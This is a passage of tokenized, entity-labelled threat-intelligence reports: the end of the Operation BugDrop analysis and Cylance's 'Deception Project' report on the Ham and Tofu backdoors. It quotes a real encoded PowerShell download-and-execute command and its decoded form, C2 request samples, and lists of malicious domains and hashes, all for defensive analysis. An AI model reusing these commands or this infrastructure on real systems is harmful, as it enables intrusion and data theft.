%USERPROFILE%\AppData\Roaming\Microsoft\VSA\klnihw22.nlp
'
,
RUNNER

The
communication
DLL
is
also
loaded
using
Reflective
DLL
Injection
.

5
.
Dropper
–
Stage
2
–
Downloader
for
Main
Module

Internal
name
:
esmina.dll

Compiled
:
Mon
Oct
10
14:47:28
2016

The
main
purpose
of
this
DLL
is
to
download
the
main
module

The
main
module
is
hosted
on
a
free
web
hosting
site
with
the
following
URL
:
windows-problem-reporting.site88.net  B_url.distribute
[Note
:
Do
not
visit
this
malicious
site.]

We
were
unable
to
find
any
information
about
this
URL
in
public
data
sources
.

Attempting
to
directly
access
the
URL
leads
to
an
'
HTTP/1.1
404
Not
Found
'
message
.

It
appear
as
if
downloading
the
module
requires
manual
approval
,
indicating
the
need
for
a
human
analyst
or
handler
in
the
loop
.

The
main
module
is
then
downloaded
and
loaded
into
memory
using
Reflective
DLL
Injection
.

6
.
Main
Module

The
main
module
downloads
the
various
data-stealing
plugins
assigned
to
each
victim
,
and
executes
them
.

It
also
collects
locally-stored
stolen
data
and
uploads
it
to
Dropbox
.

The
main
module
incorporates
a
number
of
anti-Reverse
Engineering
(
RE
)
techniques
:

Checks
if
a
debugger
is
present
.

Checks
if
process
is
running
in
a
virtualized
environment
.

Checks
if
ProcessExplorer
is
running
.

ProcessExplorer
is
used
to
identify
malware
hiding
inside
a
legitimate
process
as
a
DLL
,
which
occurs
as
a
result
of
DLL
injection
.

Checks
to
see
if
WireShark
is
running
.

WireShark
can
be
used
to
identify
malicious
traffic
originating
on
your
computer
.

It
registers
itself
in
the
registry
under
the
key
:

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\hlpAsist

RUNDLL32
'
%USERPROFILE%\AppData\Roaming\Microsoft\MSDN\iodonk18.dll
'
,
IDLE

7
.
Dropbox
Mechanisms
8/11

There
are
3
directories
on
the
server
:
obx
–
Contains
modules
used
by
the
main
module
ibx
–
Contains
exfiltrated
output
uploaded
by
the
plugins
rbx
-
Contains
basic
information
about
the
connected
client

After
the
stored
data
is
retrieved
by
the
attackers
,
it
is
deleted
from
the
Dropbox
account
.

The
Dropbox
user
that
registered
the
account
has
the
following
details
:

Name
:
P*****

Email
:
P********@mail.ru
8
.
Encryption
Mechanisms

The
data-stealing
plugins
store
all
their
output
in
:
%USERPROFILE%\AppData\Roaming\Media

Before
being
sent
to
Dropbox
by
the
main
module
,
the
files
are
encrypted
with
Blowfish
.

The
Blowfish
encryption
key
is
the
client
ID
.

9
.
Data-Stealing
Plugins

File
Collector
:
Searches
for
variety
of
file
types
that
are
stored
locally
or
on
shared
drives
(
including
doc
,
docx
,
xls
,
xlsx
,
ppt
,
pptx
,
pdf
,
zip
,
rar
,
db
,
txt
)
.

Files
are
uploaded
on-demand
.

USB
File
Collector
:
Searches
for
variety
of
file
types
on
USB
drives
(
including
doc
,
docx
,
xls
,
xlsx
,
ppt
,
pptx
,
pdf
,
zip
,
rar
,
db
,
txt
)
.

Browser
Data
Collector
:
Used
to
steal
passwords
and
other
sensitive
information
stored
in
browsers
.

Microphone
:
Captures
audio
conversations
.

Computer
Info
Collector
:
Collects
data
about
the
client
such
as
Windows
OS
version
,
computer
name
,
user
name
,
IP
address
,
MAC
address
,
antivirus
software
,
etc
.

Not
all
of
the
plugins
are
downloaded
to
every
target
.

Each
module
has
a
unique
extension
which
is
the
client
ID
.

This
is
how
the
main
module
knows
which
modules
should
be
downloaded
to
a
particular
target
.

Conclusions
1
)
Operation
BugDrop
was
a
cyber-reconnaissance
mission
;
its
goal
was
to
gather
intelligence
about
targets
in
various
domains
including
critical
infrastructure
,
media
,
and
scientific
research
.

We
have
no
evidence
that
any
damage
or
harm
has
occurred
from
this
operation
,
however
identifying
,
locating
and
performing
reconnaissance
on
targets
is
usually
the
first
phase
of
operations
with
broader
objectives
.

2
)
Skilled
hackers
with
substantial
financial
resources
carried
out
Operation
BugDrop
.

Given
the
amount
of
data
analysis
that
needed
to
be
done
on
daily
basis
,
we
believe
BugDrop
was
heavily
staffed
.

Given
the
sophistication
of
the
code
and
how
well
the
operation
was
executed
,
we
have
concluded
that
those
carrying
it
out
have
previous
field
experience
.

While
we
are
comfortable
assigning
nation-state
level
capabilities
to
this
operation
,
we
have
no
forensic
evidence
that
links
BugDrop
to
a
specific
nation-state
or
group
.

'
Attribution
'
is
notoriously
difficult
,
with
the
added
difficulty
that
skilled
hackers
can
easily
fake
clues
or
evidence
to
throw
people
off
their
tail
.

3
)
Private
and
public
sector
organizations
need
to
continuously
monitor
their
IT
and
OT
networks
for
anomalous
activities
indicating
they've
been
compromised
.

Fortunately
,
new
algorithmic
technologies
like
behavioral
analytics
are
now
available
to
rapidly
identify
unusual
or
unauthorized
activities
with
minimal
false
positives
,
especially
when
9/11
combined
with
actionable
threat
intelligence
.

Organizations
also
need
deep
forensics
to
identify
the
scope
and
impact
of
a
breach
,
as
well
as
an
enterprise-wide
incident
response
plan
that
can
be
carried
out
quickly
and
at
scale
.

Appendix  B_hash

Hashes
(
SHA-256
)

Decoy
Document
:
997841515222dbfa65d1aea79e9e6a89a0142819eaeec3467c31fa169e57076a B_hash

Dropper
:
f778ca5942d3b762367be1fd85cf7add557d26794fad187c4511b3318aff5cfd B_hash

Plugins

Screenshot
Collector
:
7d97008b00756905195e9fc008bee7c1b398a940e00b0bd4c56920c875f28bfe B_hash
dc21527bd925a7dc95b84167c162747069feb2f4e2c1645661a27e63dff8c326 B_hash
7e4b2edf01e577599d3a2022866512d7dd9d2da7846b8d3eb8cea7507fb6c92a B_hash

Keylogger
:
fc391f843b265e60de2f44f108b34e64c358f8362507a8c6e2e4c8c689fcdf67 B_hash
943daa88fe4b5930cc627f14bf422def6bab6d738a4cafd3196f71f1b7c72539 B_hash
bbe8394eb3b752741df0b30e1d1487eeda7e94e0223055771311939d27d52f78 B_hash
6c479da2e2cc296c18f21ddecc787562f600088bd37cc2154c467b0af2621937 B_hash
01aab8341e1ef1a8305cf458db714a0392016432c192332e1cd9f7479507027f B_hash

File
Collector
06dcf3dc4eab45c7bd5794aafe4d3f72bb75bcfb36bdbf2ba010a5d108b096dc B_hash
daf7d349b1b12d9cf2014384a70d5826ca3be6d05df13f7cb1af5b5f5db68d54 B_hash
24f56ba4d779b913fefed80127e9243303307728ebec85bdb5a61adc50df9eb6 B_hash
a65e79bdf971631d2097b18e43af9c25f007ae9c5baaa9bda1c470af20e1347c B_hash

USB
File
Collector
:
a47e6fab82ac654332f4e56efcc514cb2b45c5a126b9ffcd2c84a842fb0283a2 B_hash
07c25eebdbd16f176d0907e656224d6a4091eb000419823f989b387b407bfd29 B_hash
3c0f18157f30414bcfed7a138066bc25ef44a24c5f1e56abb0e2ab5617a91000 B_hash

Browser
Data
Collector
:
fb836d9897f3e8b1a59ebc00f59486f4c7aec526a9e83b171fd3e8657aadd1a1 B_hash
966804ac9bc376bede3e1432e5800dd2188decd22c358e6f913fbaaaa5a6114d B_hash
296c738805040b5b02eae3cc2b114c27b4fb73fa58bc877b12927492c038e27c B_hash
61244d5f47bb442a32c99c9370b53ff9fc2ecb200494c144e8b55069bc2fa166 B_hash
cae95953c7c4c8219325074addc9432dee640023d18fa08341bf209a42352d7d B_hash
a0400125d98f63feecac6cb4c47ed2e0027bd89c111981ea702f767a6ce2ef75 B_hash

Microphone
:
1f5e663882fa6c96eb6aa952b6fa45542c2151d6a9191c1d5d1deb9e814e5a50 B_hash
912d54589b28ee822c0442b664b2a9f05055ea445c0ec28f3352b227dc6aa2db B_hash
691afe0547bd0ab6c955a8ec93febecc298e78342f78b3dd1c8242948c051de6 B_hash

Computer
Info
Collector
:
c9bf4443135c080fb81ab79910c9cfb2d36d1027c7bf3e29ee2b194168a463a7 B_hash
10/11
5383e18c66271b210f93bee8cc145b823786637b2b8660bb32475dbe600be46e B_hash
d96e5a74da7f9b204f3dfad6d33d2ab29f860f77f5348487f4ef5276f4262311 B_hash
11/11
The
Deception
Project
:
A
New
Japanese-Centric
Threat
cylance.com/en_us/blog/the-deception-project-a-new-japanese-centric-threat.html B_url.normal

In
an
effort
to
expose
a
common
problem
we
see
happening
in
the
industry
,
Cylance
®
would
like
to
shed
some
light
on
just
how
easy
it
is
to
fake
attribution
.

The
key
factor
we
should
focus
on
,
as
an
industry
,
is
determining
HOW
an
attacker
can
take
down
an
organization
,
rather
than
focusing
only
on
the
WHO
.

Once
we
can
identify
how
the
attack
happened
,
we
can
focus
on
what's
really
important
–
prevention
.

Background

While
investigating
some
of
the
smaller
name
servers
that
APT28
/
Sofacy
routinely
use
to
host
their
infrastructure
,
Cylance
discovered
another
prolonged
campaign
that
appeared
to
exclusively
target
Japanese
companies
and
individuals
that
began
around
August
2016
.

The
later
registration
style
was
eerily
close
to
previously
registered
APT28
domains
,
however
,
the
malware
used
in
the
attacks
did
not
seem
to
line
up
at
all
.

During
the
course
of
our
investigation
,
JPCERT
published
this
analysis
of
one
of
the
group's
backdoors
.

Cylance
tracks
this
threat
group
internally
as
'
Snake
Wine
'
.

We
found
the
infrastructure
to
be
significantly
larger
than
documented
at
the
link
above
.

Cylance
believes
some
of
the
steps
taken
by
the
attacker
could
possibly
be
an
attempt
at
a
larger
disinformation
campaign
based
upon
some
of
the
older
infrastructure
that
would
link
it
to
a
well-known
CN-APT
group
.

Nearly
all
of
the
initial
data
in
this
case
was
gathered
from
delving
further
into
the
domains
hosted
by
'
It
Itch
.

'
South
Korea's
National
Intelligence
Service
(
NIS
)
previously
leveraged
It
Itch's
services
,
as
documented
by
Citizen
Lab
in
this
post
.

A
number
of
the
samples
were
signed
using
the
leaked
code-signing
certificate
from
the
Hacking
Team
breach
.

Propagation
and
Targeting

To
date
,
all
observed
attacks
were
the
result
of
spear B_malware.infosteal
phishing  I
attempts
against
the
victim
organizations
.

The
latest
batch
used
well-crafted
LNK
files
contained
within
similarly
named
password-protected
ZIP
files
.

The
LNK
files
,
when
opened
,
would
execute
a
PowerShell
command
via
'
cmd.exe
/c
'
to
download
and
execute
an
additional
payload
.

The
attackers
appeared
to
prefer
the
Google
URL
shortening
service
'
goog.gl
,
'
however
,
this
could
easily
change
as
the
attacks
evolve
.

powershell.exe
-nop
–w
hidden
-exec
bypass
-enc
'
JAAyAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGUAeABlAGMAIABiAHkAcABhAHMAcwAgAC0AYwAgACIASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAJwBoAHQAdABwAHMAOgAvAC8AZwBvAG8ALgBnAGwALwBjAHAAVAAxAE4AVwAnACcAKQAiACcAOwBpAGYAKABbAEkAbgB0AFAAdAByAF0AOgA6AFMAaQB6AGUAIAAtAGUAcQAgADgAKQB7ACQAMwAgAD0AIAAkAGUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdAAgACsAIAAiAFwAcwB5AHMAdwBvAHcANgA0AFwAVwBpAG4AZABvAHcAcwBQAG8AdwBlAHIAUwBoAGUAbABsAFwAdgAxAC4AMABcAHAAbwB3AGUAcgBzAGgAZQBsAGwAIgA7AGkAZQB4ACAAIgAmACAAJAAzACAAJAAyACIAOwB9AGUAbABzAGUAewBpAGUAeAAgACIAJgAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAkADIAIgA7AH0A

Figure
1
:
Encoded
PowerShell
Cmdlet
Contained
Within
the
LNK
File
$2='-nop
-w
hidden
-exec
bypass
-c
'
IEX
(
New-Object

System.Net.Webclient).DownloadString(''https://goo(dot)gl/cpT1NW'')'';if([IntPtr]::Size
-eq
8){$3
=
$env:SystemRoot
+
'
\syswow64\WindowsPowerShell\v1.0\powershell';iex
'
&
$3
$2';}else{iex
'
&
powershell
$2';}

Figure
2
:
Decoded
PowerShell
Snippet

The
shortened
URL
connected
to
'
hxxxp://koala
(
dot
)
acsocietyy
(
dot
)
com/acc/image/20170112001
(
dot
)
jpg
.

'
This
file
was
in
fact
another
piece
of
PowerShell
code
modified
from
'
PowerSploit
'
.

That
file
opens
a
decoy
document
and
executes
an
approximately
60kb
chunk
of
position
independent
shellcode
.

The
shellcode
upon
further
decoding
and
analysis
is
nearly
identical
to
what
Cylance
calls
'
The
Ham B_malware.backdoor
Backdoor  I
'
below
.

This
particular
variant
of
the
backdoor
references
itself
internally
as
version
'
1.6.4
'
and
beaconed
to
'
gavin
(
dot
)
ccfchrist
(
dot
)
com
.

'
The
move
to
a
shellcode-based
backdoor
was
presumably
done
to
decrease
overall
AV
detection
and
enable
deployment
via
a
wider
array
of
methods
.

A
public
report
released
here
documented
a
similar
case
in
which
several
universities
were
targeted
by
an
email
purporting
to
be
from
The
Japanese
Society
for
the
Promotion
of
Science
'
jsps
(
dot
)
go
(
dot
)
jp
'
regarding
the
need
to
renew
grant
funding
.
The
website
'
koala
(
dot
)
asocietyy
(
dot
)
com
'
was
also
used
to
host
the
following
PowerShell
payloads
:
•
ae0dd5df608f581bbc075a88c48eedeb7ac566ff750e0a1baa7718379941db86  B_hash
20170112003.jpg
•
75ef6ea0265d2629c920a6a1c0d1dd91d3c0eda86445c7d67ebb9b30e35a2a9f  B_hash
20170112002.jpg
•
723983883fc336cb575875e4e3ff0f19bcf05a2250a44fb7c2395e564ad35d48  B_hash
20170112007.jpg
•
3d5e3648653d74e2274bb531d1724a03c2c9941fdf14b8881143f0e34fe50f03  B_hash
20170112005.jpg
•
471b7edbd3b344d3e9f18fe61535de6077ea9fd8aa694221529a2ff86b06e856  B_hash
20170112.jpg
•
4ff6a97d06e2e843755be8697f3324be36e1ebeb280bb45724962ce4b6710297  B_hash
20170112001.jpg
•
9fbd69da93fbe0e8f57df3161db0b932d01b6593da86222fabef2be31899156d  B_hash
20170112006.jpg
•
f45b183ef9404166173185b75f2f49f26b2e44b8b81c7caf6b1fc430f373b50b  B_hash
20170112008.jpg
•
646f837a9a5efbbdde474411bb48977bff37abfefaa4d04f9fb2a05a23c6d543  B_hash
20170112004.jpg

The
payloads
contained
within
each
PowerShell
script
beaconed
to
the
same
domain
name
,
with
the
exception
of
'
20170112008.jpg
'
,
which
beaconed
to
'
hamiltion
(
dot
)
catholicmmb
(
dot
)
com
.
'

Earlier
attempts
used
EXE's
disguised
with
Microsoft
Word
document
icons
and
DOCX
files
within
a
similarly
named
ZIP
file
as
documented
by
JPCERT
.

Cylance
has
observed
the
following
ZIP
files
which
contained
a
similarly
named
executable
:
•
平成29年日米安保戦略対話提言(未定稿).zip
•
2016県立大学シンポジウムA4_1025.zip
•
日米関係重要事項一覧表.zip
•
ロシア歴史協会の設立と'単一'国史教科書の作成.zip
•
日米拡大抑止協議.zip
•
個人番号の提供について.zip
•
11月新学而会.zip

Malware

The
Ham B_malware.backdoor
Backdoor  I

The
Ham B_malware.backdoor
Backdoor  I
functions
primarily
as
a
modular
platform
,
which
provides
the
attacker
with
the
ability
to
directly
download
additional
modules
and
execute
them
in
memory
from
the
command
and
control
(
C2
)
server
.

The
backdoor
was
programmed
in
C++
and
compiled
using
Visual
Studio
2015
.

The
modules
that
Cylance
has
observed
so
far
provided
the
ability
to
:
•
Upload
specific
files
to
the
C2
•
Download
a
file
to
the
infected
machine
•
Load
and
execute
a
DLL
payload
•
List
running
processes
and
services
•
Execute
a
shell
command
•
Add
an
additional
layer
of
AES
encryption
to
the
network
protocol
•
Search
for
a
keyword
in
files

Legacy
AV
appears
to
have
fairly
good
coverage
for
most
of
the
samples
;
however
,
minor
changes
in
newer
samples
have
considerably
lower
detection
rates
.

JPCERT
calls
this
backdoor
'
ChChes  B_malware.infosteal
'
for
cross-reference
.

The
malware
employs
a
number
of
techniques
for
obfuscation
,
such
as
stack
construction
of
variables
and
data
,
various
XOR
encodings
and
data
reordering
schemes
,
and
some
anti-analysis
techniques
.

Perhaps
the
most
interesting
of
these
,
and
the
one
we've
chosen
to
key
on
from
a
detection
perspective
,
is
the
following
bit
of
assembly
which
was
the
final
component
in
decoding
a
large
encoded
block
of
code
:
lea
edx
,
[esi+edi]
mov
edi
,
[ebp+var_4]
mov
cl
,
[ecx+edx]
xor
cl
,
[eax+edi]
inc
eax
mov
edi
,
[ebp+arg_8]
mov
[edx]
,
cl
mov
ecx
,
[ebp+arg_0]
cmp
eax
,
ebx

This
snippet
in
the
analyzed
samples
used
a
fixed
size
XOR
key
usually
0x66
bytes
long
but
would
sequentially
XOR
every
byte
by
each
value
of
the
key
.

This
effectively
results
in
a
single
byte
XOR
by
the
end
of
the
operation
.

This
operation
made
little
sense
in
comparison
to
the
other
more
complicated
reordering
and
longer
XOR
encodings
used
prior
to
this
mechanism
.

Cylance
only
found
two
variants
to
this
code-block
,
however
,
that
could
be
easily
modified
by
the
attacker
in
the
future
.

The
code
also
makes
extensive
use
of
the
multi-byte

NOP
operation
prefixed
by
0x0F1F
.

These
operations
present
somewhat
of
a
problem
for
older
disassemblers
such
as
the
original
Ollydbg
,
but
are
trivially
patched
.

The
network
protocol
of
the
backdoor
is
well
described
by
JPCERT
,
but
Cylance
has
taken
the
liberty
to
clean
up
their
original
python
snippet
,
which
was
provided
for
decoding
the
cookie
values
:
import
hashlib
from
Crypto.Cipher
import
ARC4
def
network_decode(cookie_data
)
:
data_list
=
cookie_data.split
(
'
;
'
)
dec
=
[]
for
i
in
range(len(data_list
)
)
:
tmp
=
data_list[i]
pos
=
tmp.find('=
'
)
key
=
tmp[0:pos]
val
=
tmp[pos:]
md5
=
hashlib.md5(
)
md5.update(key
)
rc4key
=
md5.hexdigest()[8:24]
rc4
=
ARC4.new(rc4key
)
dec.append(rc4.decrypt(val.decode('base64'))[len(key):]
)
print
(
'
[*]
decoded
:
'
+
'
'
.join
(
dec
)
)

Figure
3
:
Cleaned
Script
Originally
by
JPCERT

As
noted
in
the
JPCERT
report
,
Cylance
also
found
that
in
most
cases
of
successful
infection
,
one
of
the
earliest
modules
downloaded
onto
the
system
added
an
additional
layer
of
AES
communication
to
the
traffic
.

The
backdoor
would
also
issue
anomalous
HTTP
requests
with
the
method
'
ST
'
in
the
event
that
the
C2
server
did
not
respond
appropriately
to
the
initial
request
.

An
example
request
is
shown
below
:

ST
/2C/H.htm
HTTP/1.1

Cookie
:
uQ=[REDACTED];omWwFSA=hw4biTXvqd%2FhK2TIyoLYj1%2FShw6MhEGHlWurHsUyekeuunmop4kZ;Tgnfm5E=RPBaxi%2Bf4B2r6CTd9jh5u3AHOwuyVaJeuw%3D%3D

Accept
:
*/*

User-Agent
:
Mozilla/4.0
(
compatible;
MSIE
7.0;
Windows
NT
5.1;
Trident/4.0;
.NET
CLR
2.0.50727;
.NET

CLR
3.0.4506.2152;
.NET
CLR
3.5.30729;
.NET
CLR
1.1.4322
)

Host
:
kawasaki.unhamj(dot)com B_url.cncsvr

Content-Length
:
0

Connection
:
Keep-Alive

Cache-Control
:
no-cache

Figure
4
:
Example
Request
Using
the
'
ST
'
Method

The
majority
of
the
Ham B_malware.backdoor
Backdoors I
found
to
date
have
all
been
signed
using
the
stolen
and
leaked
Hacking
Team
code-signing
certificate
.
'
HT
Srl
'
Certificate
Details
:

Status
:
Revoked

Issuer
:
VeriSign
Class
3
Code
Signing
2010
CA

Valid
:
1:00
AM
8/5/2011
to
12:59
AM
8/5/2012

Thumbprint
:
B366DBE8B3E81915CA5C5170C65DCAD8348B11F0

Serial
Number
:
3F
FC
EB
A8
3F
E0
0F
EF
97
F6
3C
D9
2E
77
EB
B9

Why
the
attackers
chose
to
use
this
expired
certificate
to
sign
their
malware
samples
is
unknown
.

The
malware
itself
bears
little
resemblance
to
previous
hacking
team
implants
and
was
likely
done
purely
as
an
attempt
to
throw
off
attribution
.

The
only
observed
persistence
method
to
date
is
the
use
of
the
standard
Windows
Run
key
'
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
'
under
either
a
user's
hive
or
HKLM
.

Cylance
found
that
the
following
three
full
file
paths
were
commonly
used
by
this
particular
backdoor
:
•
%AppData%\Reader.exe
•
%AppData%\Notron.exe
•
%AppData%\SCSI_Initiarot.exe

Cylance
also
identified
an
earlier
sample
,
which
took
advantage
of
a
self-extracting
RAR
and
a
side
loading
vulnerability
in
the
legitimate
Microsoft
Resource
Compiler
,
'
RC.exe
.
'
RC.exe
will
load
the
DLL
'
RCDLL.dll
'
via
its
import
table
.

This
modified
DLL
was
responsible
for
XOR
decoding
and
mapping
the
shellcode
version
of
the
Ham B_malware.backdoor
Backdoor  I
.

This
particular
sample
was
stored
in
a
file
called
'
RC.cfg
'
,
which
was
encoded
using
a
single
byte
XOR
against
the
key
of
0x54
.

It
appears
that
this
version
was
only
used
in
early
campaigns
,
as
the
latest
referenced
backdoor
version
Cylance
identified
was
'
v1.2.2
.
'

Tofu  B_malware.backdoor
Backdoor  I

Based
upon
Cylance's
observations
,
the
Tofu  B_malware.backdoor
Backdoor  I
was
deployed
in
far
fewer
instances
than
the
Ham B_malware.backdoor
Backdoor  I
.

It
is
a
proxy-aware
,
fully-featured
backdoor
programmed
in
C++
and
compiled
using
Visual
Studio
2015
.

The
Tofu  B_malware.backdoor
backdoor  I
makes
extensive
use
of
threading
to
perform
individual
tasks
within
the
code
.

It
communicates
with
its
C2
server
through
HTTP
over
nonstandard
TCP
ports
,
and
will
send
encoded
information
containing
basic
system
information
back
,
including
hostname
,
username
,
and
operating
system
within
the
content
of
the
POST
.

POST
/586E32A1FFFFFFFF.aspx
HTTP/1.1

Accept
:
*/*

Cookies
:
Sym1.0
:
0
,Sym2.0
:
0
,Sym3.0
:
61456
,Sym4.0
:
1

Host
:
area.wthelpdesk.com:443 B_url.cncsvr

Content-Length
:
39

Connection
:
Keep-Alive

Cache-Control
:
no-cache

Figure
5
:
Example
POST
Request
From
the
Tofu  B_malware.backdoor
Backdoor  I

Although
communication
took
place
on
TCP
port
443
,
none
of
the
traffic
was
encrypted
and
the
custom
cookies
'
Sym1.0
'
–
'
Sym4.0
'
can
be
used
to
easily
identify
the
backdoor
in
network
traffic
.

The
backdoor
has
the
ability
to
enumerate
processor
,
memory
,
drive
,
and
volume
information
,
execute
commands
directly
from
the
attacker
,
enumerate
and
remove
files
and
folders
,
and
upload
and
download
files
.

Commands
were
sent
by
the
C2
and
processed
by
the
backdoor
in
the
form
of
encoded
DWORDs
,
each
correspondeding
to
a
particular
action
listed
above
.

Tofu  B_malware.backdoor
may
also
create
two
different
bi-directional
named
pipes
on
the
system
'
\\.\pipe\1[12345678]
'
and
'
\\.\pipe\2[12345678]
'
which
could
be
accessed
via
other
compromised
machines
on
the
internal
network
.

During
an
active
investigation
,
the
file
was
found
at
'
%AppData%\iSCSI_Initiarot.exe
'
.

This
path
was
confirmed
as
a
static
location
in
the
code
that
the
backdoor
would
use
to
copy
itself
.

A
static
Run
key
was
also
used
by
the
backdoor
to
establish
persistence
on
the
victim
machine
(
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Microsoft
iSCSI
Initiator
)
.

All
of
the
samples
Cylance
identified
were
compiled
in
November
2016
,
so
these
backdoors
may
have
simply
been
tests
as
later
samples
moved
back
to
the
shellcode-based
Ham B_malware.backdoor
Backdoors I
.

The
backdoors
were
also
similarly
signed
using
the
same
stolen
code-signing
certificate
from
'
HT
Srl
.
'

C2
Infrastructure

Cylance
found
that
at
least
half
of
the
infrastructure
associated
with
The
Deception
Project
appeared
to
be
dark
or
at
least
unused
.

This
suggests
that
the
Snake
Wine
group
will
likely
continue
to
escalate
their
activity
and
persistently
target
both
private
and
government
entities
within
Japan
.

Cylance
also
found
an
extensive
network
of
Dynamic
DNS
(
DDNS
)
domains
registered
via
multiple
free
providers
was
likely
being
used
by
the
same
group
.

However
,
Cylance
was
unable
to
identify
any
current
samples
which
communicated
with
this
infrastructure
,
and
have
subsequently
separated
this
activity
from
the
rest
of
the
attacker's
infrastructure
.

Many
of
the
DDNS
domains
were
concocted
to
mimic
legitimate
windows
update
domains
such
as
'
download.windowsupdate(dot)com  B_url.unknown
'
,
'
ipv4.windowsupdate(dot)com  B_url.unknown
'
,
and
'
v4.windowsupdate(dot)com  B_url.unknown
'
.

Domain
Registration
Information
:
8/19/16
wchildress(dot)com  B_url.unknown
abellonav.poulsen(at)yandex.com B_url.unknown
8/19/16
poulsenv(dot)com  B_url.unknown
abellonav.poulsen(at)yandex.com B_url.unknown
8/19/16
toshste(dot)com B_url.unknown
toshsteffensen2(at)yandex.com B_url.unknown
9/6/16
shenajou(dot)com  B_url.unknown
ShenaJouellette(at)india.com  B_url.unknown
9/6/16
ixrayeye(dot)com  B_url.unknown
BettyWBatts(at)india.com  B_url.unknown
9/12/16
wthelpdesk(dot)com  B_url.unknown
ArmandOValcala(at)india.com B_url.unknown
9/12/16
bdoncloud(dot)com B_url.unknown
GloriaRPaige(at)india.com B_url.unknown
9/12/16
belowto(dot)com B_url.unknown
RobertoRivera(at)india.com  B_url.unknown
11/3/16
incloud-go(dot)com  B_url.unknown
RufinaRWebb(at)india.com  B_url.unknown
11/3/16
unhamj(dot)com  B_url.unknown
JuanitaRDunham(at)india.com B_url.unknown
11/3/16
cloud-maste(dot)com B_url.unknown
MeganFDelgado(at)india.com  B_url.unknown
11/4/16
cloud-kingl(dot)com B_url.unknown
ElisabethBGreen(at)india.com  B_url.unknown
11/4/16
incloud-obert(dot)com B_url.unknown
RobertJButler(at)india.com  B_url.unknown
12/6/16
fftpoor(dot)com B_url.unknown
SteveCBrown(at)india.com  B_url.unknown
12/6/16
ccfchrist(dot)com B_url.unknown
WenonaTMcMurray(at)india.com  B_url.unknown
12/7/16
catholicmmb(dot)com B_url.unknown
EmilyGLessard(at)india.com  B_url.unknown
12/7/16
usffunicef(dot)com  B_url.unknown
MarisaKParr(at)india.com  B_url.unknown
12/7/16
cwiinatonal(dot)com B_url.unknown
RobertMKnight(at)india.com  B_url.unknown
12/7/16
tffghelth(dot)com B_url.unknown
NathanABecker(at)india.com  B_url.unknown
12/7/16
acsocietyy(dot)com  B_url.unknown
PearlJBrown(at)india.com  B_url.unknown
12/8/16
tokyo-gojp(dot)com  B_url.unknown
VeraTPerkins(at)india.com B_url.unknown
12/8/16
salvaiona(dot)com B_url.unknown
DeborahAStutler(at)india.com  B_url.unknown
12/8/16
osaka-jpgo(dot)com  B_url.unknown
JudithAMartel(at)india.com  B_url.unknown
12/8/16
tyoto-go-jp(dot)com B_url.unknown
AletaFNowak(at)india.com  B_url.unknown
12/8/16
fastmail2(dot)com B_url.unknown
ClementBCarico(at)india.com B_url.unknown
12/11/16
wcwname(dot)com B_url.unknown
CynthiaRNickerson(at)india.com  B_url.unknown
12/12/16
dedgesuite(dot)net  B_url.unknown
KatherineKTaggart(at)india.com  B_url.unknown
12/12/16
wdsupdates(dot)com  B_url.unknown
GordonESlavin(at)india.com  B_url.unknown
12/12/16
nsatcdns(dot)com  B_url.unknown
SarahNBosch(at)india.com  B_url.unknown
12/13/16
vscue(dot)com B_url.unknown
ChrisTDawkins(at)india.com  B_url.unknown
12/13/16
sindeali(dot)com  B_url.unknown
DonnaJMcCray(at)india.com B_url.unknown
12/13/16
vmmini(dot)com  B_url.unknown
RaymondRKimbrell(at)india.com B_url.unknown
12/20/16
u-tokyo-ac-jp(dot)com B_url.unknown
LynnJOwens(at)india.com B_url.unknown
12/21/16
meiji-ac-jp(dot)com B_url.unknown
PearlJPoole(at)india.com  B_url.unknown
12/26/16
jica-go-jp(dot)bike B_url.unknown
AliceCLopez(at)india.com  B_url.unknown
12/27/16
mofa-go-jp(dot)com  B_url.unknown
AngelaJBirkholz(at)india.com  B_url.unknown
12/27/16
jimin-jp(dot)biz  B_url.unknown
EsmeraldaTYates(at)india.com  B_url.unknown
12/27/16
jica-go-jp(dot)biz  B_url.unknown
RonaldSFreeman(at)india.com B_url.unknown
2/9/17
jpcert(dot)org  B_url.unknown
GinaKPiller(at)india.com  B_url.unknown
2/14/2017
ijica(dot)in  B_url.unknown
DarrenMCrow(at)india.com  B_url.unknown
2/17/2017
chibashiri(dot)com  B_url.unknown
WitaTBiles(at)india.com B_url.unknown
2/17/2017
essashi(dot)com B_url.unknown
CarlosBPierson(at)india.com B_url.unknown
2/17/2017
urearapetsu(dot)com B_url.unknown
IvoryDStallcup(at)india.com B_url.unknown

Full
Domain
List
:
area.wthelpdesk(dot)com B_url.unknown
cdn.incloud-go(dot)com  B_url.unknown
center.shenajou(dot)com B_url.unknown
commissioner.shenajou(dot)com B_url.unknown
development.shenajou(dot)com  B_url.unknown
dick.ccfchrist(dot)com  B_url.unknown
document.shenajou(dot)com B_url.unknown
download.windowsupdate.dedgesuite(dot)net B_url.unknown
edgar.ccfchrist(dot)com B_url.unknown
ewe.toshste(dot)com B_url.unknown
fabian.ccfchrist(dot)com  B_url.unknown
flea.poulsenv(dot)com B_url.unknown
foal.wchildress(dot)com B_url.unknown
fukuoka.cloud-maste(dot)com B_url.unknown
gavin.ccfchrist(dot)com B_url.unknown
glicense.shenajou(dot)com B_url.unknown
hamiltion.catholicmmb(dot)com B_url.unknown
hukuoka.cloud-maste(dot)com B_url.unknown
images.tyoto-go-jp(dot)com  B_url.unknown
interpreter.shenajou(dot)com  B_url.unknown
james.tffghelth(dot)com B_url.unknown
kawasaki.cloud-maste(dot)com  B_url.unknown
kawasaki.unhamj(dot)com B_url.unknown
kennedy.tffghelth(dot)com B_url.unknown
lennon.fftpoor(dot)com  B_url.unknown
license.shenajou(dot)com  B_url.unknown
lion.wchildress(dot)com B_url.unknown
lizard.poulsenv(dot)com B_url.unknown
malcolm.fftpoor(dot)com B_url.unknown
ms.ecc.u-tokyo-ac-jp(dot)com  B_url.unknown
